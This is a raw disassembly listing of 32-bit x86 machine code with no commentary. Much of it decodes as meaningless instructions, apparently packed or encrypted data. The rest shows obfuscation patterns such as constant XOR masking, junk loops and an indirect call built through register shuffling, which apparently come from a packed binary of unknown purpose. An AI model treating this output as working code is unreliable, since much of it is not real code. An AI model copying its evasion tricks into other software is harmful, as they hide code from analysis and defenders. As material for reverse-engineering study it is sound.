  4050c2:	xchg   ebx,eax
  4050c3:	or     dh,bh
  4050c5:	arpl   WORD PTR [ebp-0x145118d5],bx
  4050cb:	push   ecx
  4050cc:	adc    BYTE PTR [ebx+0x6e9c9051],ch
  4050d2:	inc    ebx
  4050d3:	pop    ss
  4050d4:	push   ecx
  4050d5:	nop
  4050d6:	push   edx
  4050d7:	cmp    DWORD PTR [eax],esp
  4050d9:	mov    ebx,0x579d8eb5
  4050de:	gs xchg ebp,eax
  4050e0:	mov    ebp,0x5397febc
  4050e5:	add    BYTE PTR [edi*2+0x4957defb],al
  4050ec:	repz or BYTE PTR cs:[edi+0x33afd990],bl
  4050f4:	dec    eax
  4050f5:	mov    dl,0x95
  4050f7:	jne    0x405150
  4050f9:	pop    ss
  4050fa:	add    DWORD PTR [ebx+0x73144c80],ecx
  405100:	sti    
  405101:	mov    BYTE PTR [eax+0x35df9551],dh
  405107:	shl    BYTE PTR [esi+0x6d],cl
  40510a:	push   0x96cdb8cf
  40510f:	pushf  
  405110:	ret    
  405111:	adc    DWORD PTR [ecx],ebp
  405113:	repz call 0x73364767
  405119:	rcr    DWORD PTR [ebx-0x37a2c630],0xa
  405120:	lock xor eax,0x4d6ab3ef
  405126:	xor    di,sp
  405129:	inc    eax
  40512a:	(bad)  
  40512b:	and    eax,0x6aae57a4
  405130:	sub    ch,bl
  405132:	gs std 
  405134:	inc    edi
  405135:	imul   esp,ebp,0x2a88276a
  40513b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40513c:	fdivrp st(7),st
  40513e:	xchg   esi,eax
  40513f:	jns    0x40519c
  405141:	pop    esi
  405142:	dec    esi
  405143:	ss xchg ecx,eax
  405145:	enter  0xb4e0,0x5a
  405149:	fs stos DWORD PTR es:[edi],eax
  40514b:	pop    ecx
  40514c:	xor    bh,BYTE PTR [edx-0x3a]
  40514f:	sbb    BYTE PTR [ebp-0x70],0xb9
  405153:	pop    es
  405154:	sbb    dh,BYTE PTR [ecx]
  405156:	sbb    dl,BYTE PTR [ebx+edi*1]
  405159:	mov    WORD PTR [esi],ds
  40515b:	mov    ds:0x1ba0d0f6,eax
  405160:	inc    edi
  405161:	push   esp
  405162:	and    BYTE PTR [edx-0x58],ah
  405165:	int3   
  405166:	xchg   ecx,eax
  405167:	arpl   WORD PTR [edx+edi*4],bp
  40516a:	sub    BYTE PTR [esi+0x1f],dl
  40516d:	pop    edi
  40516e:	add    DWORD PTR [edx+eax*1+0x3815c023],0xffffff87
  405176:	push   eax
  405177:	push   edi
  405178:	jnp    0x40512d
  40517a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40517b:	repnz push es
  40517d:	(bad)  
  40517e:	rol    ah,0xe0
  405181:	int    0x3c
  405183:	add    BYTE PTR [ebx+0x50],bh
  405186:	in     eax,0x7d
  405188:	pop    esi
  405189:	sbb    al,0x64
  40518b:	mov    ?,WORD PTR [ebx+0x48380225]
  405191:	xchg   edi,eax
  405192:	push   ebp
  405193:	test   eax,0x1d88fa99
  405198:	shl    DWORD PTR [ebp-0x7a],1
  40519b:	dec    esi
  40519c:	inc    esp
  40519d:	daa    
  40519e:	dec    eax
  40519f:	gs sbb al,0x50
  4051a2:	adc    dh,bl
  4051a4:	and    edi,esi
  4051a6:	jmp    0xcaff:0xa091f670
  4051ad:	jno    0x4051e5
  4051af:	mov    edi,0xd1288ab7
  4051b4:	scas   eax,DWORD PTR es:[edi]
  4051b5:	popf   
  4051b6:	cld    
  4051b7:	mov    esi,0x9695134d
  4051bc:	mov    ebp,0xce603b9b
  4051c1:	(bad)  [edi+0x7d]
  4051c4:	bound  edi,QWORD PTR [ecx+ecx*4]
  4051c7:	jne    0x40520d
  4051c9:	mov    ah,BYTE PTR [ecx]
  4051cb:	jmp    FWORD PTR [eax]
  4051cd:	shl    BYTE PTR [esi+ebx*1-0x76f75968],0xef
  4051d5:	add    ah,bh
  4051d7:	retf   0x6a30
  4051da:	sub    ah,al
  4051dc:	mov    esi,0xb43696d8
  4051e1:	test   DWORD PTR [edi],ebp
  4051e3:	out    dx,al
  4051e4:	xor    al,0x5
  4051e6:	mov    al,ds:0xea7e6b89
  4051eb:	push   ecx
  4051ec:	jno    0x4051a0
  4051ee:	cmp    dl,BYTE PTR [edx-0x2a1b4d30]
  4051f4:	cld    
  4051f5:	mov    al,ds:0x4dbb59d9
  4051fa:	vmovhpd xmm7,xmm0,QWORD PTR [eax-0x73c35012]
  405202:	aam    0xd7
  405204:	hlt    
  405205:	push   ebx
  405206:	ret    
  405207:	xor    al,0x5
  405209:	arpl   sp,bp
  40520b:	mov    ecx,0xdbd0f576
  405210:	cs mov dl,0xe5
  405213:	jo     0x4051d7
  405215:	mov    ecx,0xc0b95891
  40521a:	in     al,0xe9
  40521c:	popa   
  40521d:	mov    bl,0x12
  40521f:	lods   al,BYTE PTR ds:[esi]
  405220:	jle    0x405217
  405222:	xor    eax,ebx
  405224:	add    eax,0x3272dc
  405229:	jmp    0x405392
  40522e:	mov    ecx,DWORD PTR [ebp-0x38]
  405231:	add    ecx,DWORD PTR [ebp+0x8]
  405234:	mov    DWORD PTR [ebp-0x10],ecx
  405237:	mov    ecx,DWORD PTR [ebp-0x1c]
  40523a:	test   ecx,ecx
  40523c:	je     0x40531d
  405242:	mov    DWORD PTR [ebp-0x20],0x0
  405249:	push   0x3
  40524b:	xor    edx,edx
  40524d:	pop    edx
  40524e:	add    edx,0x8
  405251:	push   edx
  405252:	pop    ecx
  405253:	push   0x6
  405255:	dec    ecx
  405256:	pop    ebx
  405257:	dec    ebx
  405258:	xchg   ebx,ecx
  40525a:	sub    ebx,ecx
  40525c:	xchg   ebx,ecx
  40525e:	dec    ecx
  40525f:	mov    eax,DWORD PTR [ebp-0x1c]
  405262:	imul   eax,ecx
  405265:	sub    esp,eax
  405267:	mov    DWORD PTR [ebp-0x20],esp
  40526a:	mov    eax,DWORD PTR [ebp-0x4]
  40526d:	mov    ecx,0x7510894
  405272:	xor    eax,ecx
  405274:	mov    edx,0x3272dc
  405279:	add    eax,edx
  40527b:	mov    DWORD PTR [ebp+0x8],eax
  40527e:	mov    eax,DWORD PTR [ebp-0x14]
  405281:	xor    eax,ecx
  405283:	add    eax,edx
  405285:	mov    edx,DWORD PTR [ebp+0x14]
  405288:	imul   eax,DWORD PTR [edx]
  40528b:	mov    edx,DWORD PTR [ebp-0x4]
  40528e:	xor    edx,ecx
  405290:	mov    ecx,DWORD PTR [ebp+0x8]
  405293:	lea    ecx,[edx+ecx*1+0x3272dc]
  40529a:	cmp    ecx,eax
  40529c:	je     0x405313
  4052a2:	mov    edi,DWORD PTR [ebp-0x14]
  4052a5:	mov    eax,DWORD PTR [ebp+0x8]
  4052a8:	mov    edx,DWORD PTR [ebp+0x14]
  4052ab:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052af:	mov    ecx,0x7510894
  4052b4:	xor    edx,edx
  4052b6:	xor    edi,ecx
  4052b8:	mov    esi,0x3272dc
  4052bd:	add    edi,esi
  4052bf:	div    edi
  4052c1:	mov    edx,DWORD PTR [ebp-0x4]
  4052c4:	xor    edx,ecx
  4052c6:	lea    eax,[edx+eax*1+0x3272dc]
  4052cd:	mov    edx,DWORD PTR [ebp+0x8]
  4052d0:	mov    edi,DWORD PTR [ebp-0x20]
  4052d3:	mov    DWORD PTR [edi+edx*4],eax
  4052d6:	mov    eax,DWORD PTR [ebp-0x14]
  4052d9:	mov    edx,DWORD PTR [ebp+0x8]
  4052dc:	xor    eax,ecx
  4052de:	lea    eax,[eax+edx*1+0x3272dc]
  4052e5:	mov    DWORD PTR [ebp+0x8],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x14]
  4052eb:	mov    edx,DWORD PTR [ebp+0x14]
  4052ee:	xor    eax,ecx
  4052f0:	add    eax,esi
  4052f2:	imul   eax,DWORD PTR [edx]
  4052f5:	mov    edx,DWORD PTR [ebp-0x4]
  4052f8:	xor    edx,ecx
  4052fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4052fd:	lea    ecx,[edx+ecx*1+0x3272dc]
  405304:	cmp    ecx,eax
  405306:	jne    0x4052a2
  40530c:	mov    eax,esi
  40530e:	jmp    0x405318
  405313:	mov    eax,0x3272dc
  405318:	mov    ebx,0x7510894
  40531d:	mov    ecx,DWORD PTR [ebp-0x4]
  405320:	xor    ecx,ebx
  405322:	add    ecx,eax
  405324:	mov    DWORD PTR [ebp-0xc],ecx
  405327:	mov    ebx,0x65655
  40532c:	add    ebx,0x3234
  405332:	xchg   ebx,esi
  405334:	xor    ebx,ebx
  405336:	push   esi
  405337:	mov    esi,ebx
  405339:	pop    ebx
  40533a:	mov    edx,esi
  40533c:	add    ebx,0x1002
  405342:	lea    eax,[ebp-0x10]
  405345:	add    edx,eax
  405347:	add    edx,0x5
  40534a:	push   edx
  40534b:	inc    esi
  40534c:	pop    ecx
  40534d:	dec    ecx
  40534e:	xchg   ecx,eax
  40534f:	dec    eax
  405350:	xchg   ecx,eax
  405351:	dec    ecx
  405352:	xchg   ecx,edx
  405354:	dec    edx
  405355:	push   edx
  405356:	mov    edx,ebx
  405358:	pop    ebx
  405359:	dec    ebx
  40535a:	call   DWORD PTR [ebx]
  40535c:	cmp    DWORD PTR [ebp+0x10],esi
  40535f:	je     0x40537e
  405365:	xchg   edx,eax
  405366:	push   0xb
  405368:	pop    ecx
  405369:	push   0x4
  40536b:	pop    ebx
  40536c:	inc    ebx
  40536d:	xchg   ebx,ecx
  40536f:	sub    ebx,ecx
  405371:	xchg   ebx,ecx
  405373:	dec    ecx
  405374:	dec    ecx
  405375:	mov    eax,DWORD PTR [ebp-0x1c]
  405378:	imul   eax,ecx
  40537b:	add    esp,eax
  40537d:	xchg   edx,eax
  40537e:	push   eax
  40537f:	xor    ebx,ebx
  405381:	mov    edx,esp
  405383:	dec    edx
  405384:	inc    ebx
  405385:	add    ebx,DWORD PTR [edx+ebx*1]
  405388:	dec    ebx
  405389:	xor    edx,edx
  40538b:	add    DWORD PTR [ebp-0xc],ebx
  40538e:	pop    ebx
  40538f:	mov    eax,DWORD PTR [ebp-0xc]
  405392:	pop    edi
  405393:	pop    esi
  405394:	pop    ebx
  405395:	leave  
  405396:	ret    0x10
  405399:	push   ebp
  40539a:	mov    ebp,esp
  40539c:	sub    esp,0x18
  40539f:	and    DWORD PTR ds:0x413c1e,0x0
  4053a9:	mov    ecx,DWORD PTR ds:0x413c1e
  4053af:	inc    ecx
  4053b0:	mov    DWORD PTR ds:0x413c1e,ecx
  4053b6:	cmp    DWORD PTR ds:0x413c1e,0x8
  4053bd:	jne    0x4053d7
  4053c3:	push   DWORD PTR [ebp-0x20]
  4053c6:	push   0x413cf0
  4053cb:	push   DWORD PTR [ebp-0x24]
  4053ce:	push   DWORD PTR [ebp-0x14]
  4053d1:	call   DWORD PTR ds:0x416770
  4053d7:	cmp    DWORD PTR ds:0x413c1e,0x7
  4053de:	jne    0x4053f3
  4053e4:	xor    ecx,ecx
  4053e6:	or     ecx,DWORD PTR ds:0x413c1e
  4053ec:	inc    ecx
  4053ed:	mov    DWORD PTR ds:0x413c1e,ecx
  4053f3:	cmp    DWORD PTR ds:0x413c1e,0x1f
  4053fa:	jb     0x4053a9
  405400:	and    DWORD PTR ds:0x413c12,ecx
  405406:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  40540d:	xor    edx,edx
  40540f:	or     edx,DWORD PTR ds:0x413cc0
  405415:	mov    edx,DWORD PTR [edx]
  405417:	and    DWORD PTR ds:0x413ce8,edx
  40541d:	lea    eax,[ebp+0x14]
  405420:	mov    DWORD PTR [ebp-0x4],eax
  405423:	push   esi
  405424:	adc    edx,ecx
  405426:	mov    esi,0xf89c85b0
  40542b:	mov    DWORD PTR [ebp-0xc],esi
  40542e:	and    DWORD PTR ds:0x413c74,0x0
  405438:	jmp    0x40544a
  40543d:	mov    edx,DWORD PTR ds:0x413c74
  405443:	inc    edx
  405444:	mov    DWORD PTR ds:0x413c74,edx
  40544a:	cmp    DWORD PTR ds:0x413c74,0x1a
  405451:	jae    0x405550
  405457:	cmp    DWORD PTR ds:0x413c74,0x10
  40545e:	jne    0x40547c
  405464:	push   0x41401c
  405469:	push   DWORD PTR [ebp-0x14]
  40546c:	push   0x416140
  405471:	push   0x4161b2
  405476:	call   DWORD PTR ds:0x416774
  40547c:	cmp    DWORD PTR ds:0x413c74,0xf
  405483:	jne    0x405498
  405489:	xor    edx,edx
  40548b:	add    edx,DWORD PTR ds:0x413c74
  405491:	inc    edx
  405492:	mov    DWORD PTR ds:0x413c74,edx
  405498:	jmp    0x40543d
  40549d:	and    DWORD PTR ds:0x413c0e,0x0
  4054a7:	jmp    0x4054b9
  4054ac:	mov    ecx,DWORD PTR ds:0x413c0e
  4054b2:	inc    ecx
  4054b3:	mov    DWORD PTR ds:0x413c0e,ecx
  4054b9:	cmp    DWORD PTR ds:0x413c0e,0x16
  4054c0:	jae    0x405550
  4054c6:	cmp    DWORD PTR ds:0x413c0e,0x7
  4054cd:	jne    0x4054e8
  4054d3:	push   0x1925
  4054d8:	push   0x413c1a
  4054dd:	push   0x416140
  4054e2:	call   DWORD PTR ds:0x416778
  4054e8:	cmp    DWORD PTR ds:0x413c0e,0x6
  4054ef:	jne    0x405504
  4054f5:	xor    ecx,ecx
  4054f7:	or     ecx,DWORD PTR ds:0x413c0e
  4054fd:	inc    ecx
  4054fe:	mov    DWORD PTR ds:0x413c0e,ecx
  405504:	jmp    0x4054ac
  405509:	mov    DWORD PTR ds:0x413d1c,0x15
  405513:	cmp    DWORD PTR ds:0x413d1c,0x0
  40551a:	je     0x405550
  405520:	cmp    DWORD PTR ds:0x413d1c,0x21
  405527:	jne    0x405538
  40552d:	push   0x416025
  405532:	call   DWORD PTR ds:0x41677c
  405538:	mov    ecx,DWORD PTR ds:0x413d1c
  40553e:	dec    ecx
  40553f:	mov    DWORD PTR ds:0x413d1c,ecx
  405545:	jmp    0x405513
  40554a:	adc    edx,0x7769
  405550:	lea    eax,[ebp-0xc]
  405553:	mov    DWORD PTR [ebp-0x14],eax
  405556:	or     eax,DWORD PTR ds:0x413c0a
  40555c:	mov    eax,DWORD PTR [ebp-0xc]
  40555f:	and    edx,edx
  405561:	mov    edx,DWORD PTR [ebp-0x14]
  405564:	mov    ecx,0x7510894
  405569:	xor    eax,ecx
  40556b:	add    eax,0x3272dc
  405570:	mov    DWORD PTR [edx],eax
  405572:	and    DWORD PTR ds:0x413d34,0x0
  40557c:	jmp    0x40558c
  405581:	mov    eax,ds:0x413d34
  405586:	inc    eax
  405587:	mov    ds:0x413d34,eax
  40558c:	cmp    DWORD PTR ds:0x413d34,0x17
  405593:	jae    0x4055dc
  405599:	cmp    DWORD PTR ds:0x413d34,0x8
  4055a0:	jne    0x4055b9
  4055a6:	push   0x413cec
  4055ab:	push   DWORD PTR [ebp-0x24]
  4055ae:	push   0x416049
  4055b3:	call   DWORD PTR ds:0x416780
  4055b9:	cmp    DWORD PTR ds:0x413d34,0x7
  4055c0:	jne    0x4055d1
  4055c6:	mov    eax,ds:0x413d34
  4055cb:	inc    eax
  4055cc:	mov    ds:0x413d34,eax
  4055d1:	jmp    0x405581
  4055d6:	and    edx,DWORD PTR ds:0x413bfe
  4055dc:	mov    eax,ds:0x41622c
  4055e1:	mov    edx,DWORD PTR [ebp-0x4]
  4055e4:	add    DWORD PTR ds:0x413bf6,0x4ad3
  4055ee:	mov    eax,DWORD PTR [eax]
  4055f0:	add    eax,DWORD PTR [edx]
  4055f2:	sbb    DWORD PTR ds:0x413c80,0x777b
  4055fc:	push   edi
  4055fd:	xor    DWORD PTR ds:0x413c06,ebx
  405603:	mov    DWORD PTR [ebp-0x8],eax
  405606:	mov    edi,DWORD PTR [ebp+0x8]
  405609:	movzx  eax,BYTE PTR ds:0x413d28
  405610:	sub    DWORD PTR ds:0x413c06,eax
  405616:	mov    eax,ds:0x4163b4
  40561b:	mov    eax,DWORD PTR [eax+0x198]
  405621:	adc    edx,DWORD PTR ds:0x414010
  405627:	xor    edi,ecx
  405629:	mov    edx,0x3272dc
  40562e:	add    DWORD PTR ds:0x413c1a,0x413cd8
  405638:	add    edi,edx
  40563a:	mov    DWORD PTR ds:0x413d28,0x4988
  405644:	cmp    DWORD PTR [eax],edi
  405646:	je     0x40565d
  40564c:	mov    eax,DWORD PTR [eax]
  40564e:	mov    DWORD PTR ds:0x413ce4,0xf81
  405658:	jmp    0x407c4a
  40565d:	mov    eax,DWORD PTR [ebp+0x18]
  405660:	mov    DWORD PTR ds:0x413c06,0x7bbf
  40566a:	cmp    eax,esi
  40566c:	mov    DWORD PTR ds:0x413d30,0x2bf7
  405676:	jne    0x405686
  40567c:	push   0xf89c85b1
  405681:	jmp    0x407c39
  405686:	mov    esi,DWORD PTR [ebp+0x18]
  405689:	movzx  eax,WORD PTR ds:0x413cf0
  405690:	mov    eax,0xf89c85b2
  405695:	cmp    esi,eax
  405697:	jne    0x407c29
  40569d:	mov    eax,DWORD PTR [ebp+0x10]
  4056a0:	inc    DWORD PTR ds:0x413c80
  4056a6:	xor    eax,ecx
  4056a8:	add    eax,edx
  4056aa:	mov    DWORD PTR [ebp-0x18],eax
  4056ad:	adc    DWORD PTR ds:0x413d1c,0x3347
  4056b7:	mov    eax,DWORD PTR [ebp+0xc]
  4056ba:	mov    esi,DWORD PTR [ebp-0x8]
  4056bd:	xor    eax,ecx
  4056bf:	sbb    DWORD PTR ds:0x413ce4,0x413c70
  4056c9:	add    eax,edx
  4056cb:	imul   eax,DWORD PTR [esi]
  4056ce:	and    DWORD PTR ds:0x413c0a,ebx
  4056d4:	mov    esi,DWORD PTR [ebp+0x8]
  4056d7:	and    DWORD PTR ds:0x413d24,0x413c02
  4056e1:	xor    esi,ecx
  4056e3:	add    esi,edx
  4056e5:	cmp    esi,eax
  4056e7:	movzx  eax,BYTE PTR ds:0x413cf0
  4056ee:	mov    eax,DWORD PTR [ebp-0x4]
  4056f1:	push   ebx
  4056f2:	mov    DWORD PTR ds:0x414000,0x6197
  4056fc:	je     0x40577e
  405702:	and    DWORD PTR ds:0x413c1e,0x0
  40570c:	jmp    0x40571e
  405711:	mov    esi,DWORD PTR ds:0x413c1e
  405717:	inc    esi
  405718:	mov    DWORD PTR ds:0x413c1e,esi
  40571e:	cmp    DWORD PTR ds:0x413c1e,0x14
  405725:	jae    0x405765
  40572b:	cmp    DWORD PTR ds:0x413c1e,0xa
  405732:	jne    0x405746
  405738:	push   0x413d1c
  40573d:	push   DWORD PTR [ebp-0x24]
  405740:	call   DWORD PTR ds:0x416784
  405746:	cmp    DWORD PTR ds:0x413c1e,0x9
  40574d:	jne    0x405760
  405753:	mov    esi,DWORD PTR ds:0x413c1e
  405759:	inc    esi
  40575a:	mov    DWORD PTR ds:0x413c1e,esi
  405760:	jmp    0x405711
  405765:	mov    esi,DWORD PTR [ebp-0x18]
  405768:	add    DWORD PTR [eax],esi
  40576a:	mov    eax,DWORD PTR [ebp-0x4]
  40576d:	mov    esi,DWORD PTR [ebp+0xc]
  405770:	xor    esi,ecx
  405772:	add    esi,edx
  405774:	imul   esi,DWORD PTR [eax]
  405777:	mov    DWORD PTR [eax],esi
  405779:	jmp    0x405783
  40577e:	mov    esi,DWORD PTR [ebp+0x14]
  405781:	xor    DWORD PTR [eax],esi
  405783:	mov    eax,DWORD PTR [ebp-0x4]
  405786:	mov    edi,DWORD PTR [ebp+0x10]
  405789:	xor    edi,ecx
  40578b:	mov    esi,0xffcd8d24
  405790:	mov    ebx,esi
  405792:	sub    ebx,edi
  405794:	add    DWORD PTR [eax],ebx
  405796:	mov    eax,DWORD PTR [ebp-0x4]
  405799:	mov    edi,DWORD PTR [ebp-0x8]
  40579c:	add    edi,DWORD PTR [eax]
  40579e:	mov    DWORD PTR [ebp-0x8],edi
  4057a1:	mov    eax,DWORD PTR [ebp+0xc]
  4057a4:	mov    edi,DWORD PTR [ebp+0xc]
  4057a7:	xor    edi,ecx
  4057a9:	xor    eax,ecx
  4057ab:	lea    eax,[eax+edi*1+0x64e5b8]
  4057b2:	mov    edi,DWORD PTR [ebp+0xc]
  4057b5:	xor    edi,ecx
  4057b7:	add    edi,edx
  4057b9:	imul   eax,edi
  4057bc:	mov    edi,DWORD PTR [ebp+0xc]
  4057bf:	xor    edi,ecx
  4057c1:	sub    edi,eax
  4057c3:	mov    eax,DWORD PTR [ebp-0x4]
  4057c6:	add    edi,edx
  4057c8:	cmp    DWORD PTR [eax],edi
  4057ca:	mov    eax,DWORD PTR [ebp-0x4]
  4057cd:	mov    edi,DWORD PTR [ebp+0x10]
  4057d0:	jg     0x4057e3
  4057d6:	xor    edi,ecx
  4057d8:	mov    ebx,esi
  4057da:	sub    ebx,edi
  4057dc:	add    DWORD PTR [eax],ebx
  4057de:	jmp    0x4057e9
  4057e3:	xor    edi,ecx
  4057e5:	add    edi,edx
  4057e7:	add    DWORD PTR [eax],edi
  4057e9:	mov    eax,DWORD PTR [ebp-0x8]
  4057ec:	mov    edi,DWORD PTR [ebp-0x10]
  4057ef:	mov    eax,DWORD PTR [eax]
  4057f1:	jmp    0x407b3d
  4057f6:	imul   ebp,DWORD PTR [edx+0x66],0xaba967a5
  4057fd:	stos   BYTE PTR es:[edi],al
  4057fe:	(bad)  
  4057ff:	sbb    eax,0xf5a894ee
  405804:	and    al,0xb7
  405806:	loopne 0x405867
  405808:	jl     0x405886
  40580a:	dec    ebx
  40580b:	pop    edi
  40580c:	jl     0x40588a
  40580e:	scas   ax,WORD PTR es:[edi]
  405810:	dec    esp
  405811:	(bad)  
  405813:	cli    
  405814:	into   
  405815:	push   0x13
  405817:	inc    esi
  405818:	loope  0x405840
  40581a:	xor    al,0x9e
  40581d:	mov    edi,0x9f91731d
  405822:	(bad)  
  405823:	hlt    
  405824:	into   
  405825:	loop   0x405810
  405827:	dec    ebx
  405828:	push   cs
  405829:	cmp    dh,ah
  40582b:	outs   dx,DWORD PTR ds:[esi]
  40582c:	cs popa 
  40582e:	jns    0x4058a1
  405830:	mov    bl,BYTE PTR [eax-0x6f997962]
  405836:	mov    edx,0x9a70a01c
  40583b:	in     al,0x7a
  40583d:	xchg   esi,eax
  40583f:	lds    eax,FWORD PTR [eax-0x45]
  405842:	popf   
  405843:	jb     0x405894
  405845:	push   cs
  405846:	jne    0x4057e7
  405848:	mov    edi,0x3983a54
  40584d:	les    edx,FWORD PTR ds:0xa3d426d9
  405853:	cmp    BYTE PTR [eax],0x7d
  405856:	cmp    al,ch
  405858:	xor    esp,DWORD PTR [eax]
  40585a:	mov    eax,ds:0x5d069b70
  40585f:	out    0x86,al
  405861:	aam    0x17
  405863:	popa   
  405864:	lahf   
  405865:	sub    eax,0x4c3c50fd
  40586a:	test   eax,0x7e9394a2
  40586f:	pop    ds
  405870:	sub    al,0x59
  405872:	ss iret 
  405874:	add    BYTE PTR [esi],bl
  405876:	mov    bh,0x5c
  405878:	fnsave [esp+ebx*2-0x394f8f6b]
  40587f:	sub    DWORD PTR [ebp-0x27],0x3fda9e81
  405886:	pop    ss
  405887:	aaa    
  405888:	aad    0x8b
  40588a:	bound  esp,QWORD PTR [edx+0x7b]
  40588d:	mov    ds:0xe72aeb25,eax
  405892:	(bad)  [ebx+0x7ddce4fd]
  405898:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40589a:	jg     0x40587d
  40589c:	and    eax,DWORD PTR [eax]
  40589e:	test   DWORD PTR [eax+0x5e],ecx
  4058a1:	fwait
  4058a2:	bound  ecx,QWORD PTR [eax]
  4058a4:	daa    
  4058a5:	cmp    al,0xd5
  4058a7:	mov    edi,0x51bc110f
  4058ac:	call   0xbac808cc
  4058b1:	dec    edx
  4058b2:	mov    eax,DWORD PTR [ecx]
  4058b4:	mov    ds:0x674c24ba,eax
  4058b9:	(bad)  
  4058ba:	sub    eax,0x4a80bac
  4058bf:	jmp    0x405910
  4058c1:	jb     0x40586f
  4058c3:	or     esi,DWORD PTR [ecx-0x2525fb0e]
  4058c9:	in     eax,dx
  4058ca:	daa    
  4058cb:	xchg   edx,ecx
  4058cd:	ror    DWORD PTR [edx],cl
  4058cf:	jmp    0x405922
  4058d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d2:	sti    
  4058d3:	inc    edx
  4058d4:	xor    eax,0xfc6f4c39
  4058d9:	dec    ecx
  4058da:	and    BYTE PTR [ebx],0x16
  4058dd:	loopne 0x405937
  4058df:	ds dec edi
  4058e1:	adc    eax,0x9d2f41d9
  4058e6:	ret    0x5a38
  4058e9:	sahf   
  4058ea:	out    0x66,eax
  4058ec:	repnz push edx
  4058ee:	leave  
  4058ef:	pop    eax
  4058f0:	outs   dx,BYTE PTR ds:[esi]
  4058f1:	jb     0x4058ff
  4058f3:	rcl    BYTE PTR [ebp-0x51050779],1
  4058f9:	push   ss
  4058fa:	xor    esi,DWORD PTR [esi-0x5e]
  4058fd:	sar    DWORD PTR [ebp-0x55],cl
  405900:	sub    DWORD PTR [edx+eax*1+0x5b],0xfffffff3
  405905:	xchg   esp,eax
  405906:	or     ecx,DWORD PTR [ecx]
  405908:	repz shl DWORD PTR [edx],0x97
  40590c:	inc    esi
  40590d:	jmp    0x883d:0x481b192
  405914:	adc    al,0xdd
  405916:	test   DWORD PTR [esi-0x1],eax
  405919:	ror    bh,1
  40591b:	ja     0x4058f2
  40591d:	jno    0x4058f4
  40591f:	(bad)  
  405920:	push   0x74
  405922:	push   edx
  405923:	in     al,0x69
  405925:	addr16 (bad) 
  405927:	mov    bh,0x19
  405929:	or     DWORD PTR ds:0x31ebfd6c,ebp
  40592f:	cmp    ch,BYTE PTR [edx+0x67]
  405932:	push   edx
  405933:	jne    0x4058ed
  405935:	(bad)  [esp+edx*1+0x3d]
  405939:	push   edx
  40593a:	push   eax
  40593b:	fwait
  40593c:	neg    DWORD PTR [edi-0x23f468ae]
  405942:	pop    ebp
  405943:	cmp    dl,BYTE PTR [ecx+0x51]
  405946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405947:	xor    eax,0x16106c0a
  40594c:	mov    ah,0xd2
  40594e:	jecxz  0x4058e7
  405950:	data16 ja 0x4058d4
  405953:	jns    0x4059cb
  405955:	jo     0x40597d
  405957:	fisubr DWORD PTR [eax+0x29]
  40595a:	ret    
  40595b:	daa    
  40595c:	push   esp
  40595d:	or     BYTE PTR [ebp+0x2],bl
  405960:	mov    ebp,0x11fecc48
  405965:	adc    dl,bh
  405967:	xabort 0x78
  40596a:	les    ecx,FWORD PTR [ecx+edx*8+0x4c73948]
  405971:	mov    eax,0x713df672
  405976:	sbb    eax,0xc577f0fd
  40597b:	pop    eax
  40597c:	sbb    dl,BYTE PTR [ebx-0x3c]
  40597f:	iret   
  405980:	fadd   QWORD PTR [ecx]
  405982:	lahf   
  405983:	test   BYTE PTR [ecx],ah
  405985:	cld    
  405986:	adc    dh,BYTE PTR [esi]
  405988:	mov    al,ds:0x1ba1ac99
  40598d:	push   ebx
  40598e:	push   ecx
  40598f:	mov    ds:0xa916c329,al
  405994:	sub    ch,BYTE PTR [ecx+0x3f4a0c58]
  40599a:	and    DWORD PTR [eax-0x6b],ecx
  40599d:	dec    ecx
  40599e:	or     DWORD PTR [esi],ebp
  4059a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a1:	mov    bp,ds
  4059a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059a5:	in     al,0xec
  4059a7:	stos   DWORD PTR es:[edi],eax
  4059a8:	jb     0x405a08
  4059aa:	(bad)  
  4059ab:	dec    DWORD PTR [eax-0x55cb1113]
  4059b1:	push   0xb3ea4244
  4059b6:	fwait
  4059b7:	mov    esi,0x4258dcd8
  4059bc:	fsubr  QWORD PTR [eax-0xfca78d2]
  4059c2:	pop    ds
  4059c3:	imul   edi,DWORD PTR [edx-0x696ce4ea],0x2b54c1cf
  4059cd:	repnz or BYTE PTR [ecx+0x70d9b022],0x62
  4059d5:	cmp    DWORD PTR [edi+0x7c],eax
  4059d8:	sub    ah,BYTE PTR [ebx-0x50]
  4059db:	fwait
  4059dc:	xor    DWORD PTR [eax+0x5d7da0e6],ebp
  4059e2:	(bad)  
  4059e3:	int3   
  4059e4:	jp     0x405a1c
  4059e6:	pop    esi
  4059e7:	xor    dl,BYTE PTR ds:0x312b4832
  4059ed:	cmc    
  4059ee:	mov    ah,0x35
  4059f0:	xchg   esi,eax
  4059f1:	in     al,0x3a
  4059f3:	stos   BYTE PTR es:[edi],al
  4059f4:	jnp    0x4059c2
  4059f6:	dec    eax
  4059f7:	xor    BYTE PTR [ebx+0x5b],ch
  4059fa:	push   ebp
  4059fb:	fiadd  WORD PTR [eax+0x7eec185c]
  405a01:	mov    dl,0xcb
  405a03:	xor    bh,BYTE PTR [ecx]
  405a05:	dec    edi
  405a06:	sbb    DWORD PTR [ebx],edi
  405a08:	scas   al,BYTE PTR es:[edi]
  405a09:	add    eax,0x5573d6cd
  405a0e:	ins    BYTE PTR es:[edi],dx
  405a0f:	cli    
  405a10:	mov    dl,0x4f
  405a12:	daa    
  405a13:	jmp    0x5c3:0x6a2c7106
  405a1a:	(bad)  [ecx-0x6691ca31]
  405a20:	lea    ebx,[edx-0x5f]
  405a23:	or     al,0xdf
  405a25:	mov    ah,0xd8
  405a27:	ins    BYTE PTR es:[edi],dx
  405a28:	or     al,0x96
  405a2a:	mov    dh,0xcf
  405a2c:	ja     0x405a9e
  405a2e:	lods   eax,DWORD PTR ds:[esi]
  405a2f:	cwde   
  405a30:	dec    ecx
  405a31:	int    0x39
  405a33:	lahf   
  405a34:	imul   BYTE PTR [ebx+esi*2]
  405a37:	jns    0x405ab2
